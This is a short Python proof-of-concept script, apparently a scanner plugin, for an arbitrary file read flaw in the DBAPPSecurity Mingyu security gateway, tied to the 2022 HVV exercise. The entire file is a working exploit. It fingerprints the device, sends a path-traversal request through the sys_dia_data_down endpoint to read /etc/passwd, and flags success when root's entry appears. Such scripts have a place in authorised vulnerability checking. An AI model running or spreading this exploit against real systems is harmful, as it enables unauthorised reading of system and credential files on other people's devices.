import requests
import urllib, re

def verify(url):
    relsult = {
        'name': '安恒明御安全网关 任意文件读取(2022HVV)',
        'vulnerable': False,
        'attack': False,
        'url': url,
    }
    timeout = 3
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ",
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload = '/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd'
    vurl = urllib.parse.urljoin(url, payload)
    try:
        finger_rep = requests.get(url, headers=headers, timeout=timeout, verify=False)
        if len(finger_rep.headers['P3P']) > 0:
            rep = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
            if re.search('root:.*:0:0', rep.text) and rep.status_code == 200:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult
    except:
        return relsult
